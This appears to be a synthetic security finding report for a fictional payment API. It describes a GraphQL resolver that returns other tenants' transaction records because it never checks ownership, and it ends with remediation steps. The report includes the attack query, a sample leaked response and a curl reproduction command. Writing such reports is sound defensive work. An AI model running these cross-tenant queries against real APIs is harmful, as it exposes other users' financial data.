# Security Analysis Report
**System:** PayBridge Transaction API
**Domain:** FinTech / Payment Processing
**Example ID:** GQL-0320
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.1 | Client-assumed authority on `getResource` — attacker reads fintech transaction records outside their scope |

---

## Finding 1 — Insecure Design: Client-Assumed Authority on Transaction Resource (Pattern 3.1)

### Summary
The GraphQL API at `https://api.paybridge-transactio.example.com/graphql` exposes a `getResource` resolver that assumes the client only supplies `resourceId` values it legitimately owns (client-assumed authority). No JWT `tenantId` validation is performed; the attacker reads fintech transaction records for `tenant-999f` belonging to another user.

**Note:** `x-request-id: req-a530999f` is a server-assigned response header; it does not appear in the outgoing request. The HAR request and response both use `getResource` — no inconsistency in operation name.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected endpoint:** `POST https://api.paybridge-transactio.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.paybridge-transactio.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { getResource(id: \"R-2320\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}
```

**Response — Victim FinTech Transaction Record**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-999f",
      "ownerId": "other-user-a530999f",
      "data": {
        "sensitiveField": "CONFIDENTIAL-a530999f",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.paybridge-transactio.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { getResource(id: \"R-2320\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
# Vulnerable: tenantId: tenant-999f, sensitiveField: CONFIDENTIAL-a530999f
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Resolver must compare `object.tenantId` against `jwt.tenantId` claim before returning data.
2. Do not trust client-supplied IDs — always verify server-side ownership.
3. Redis cache key must include tenant dimension.
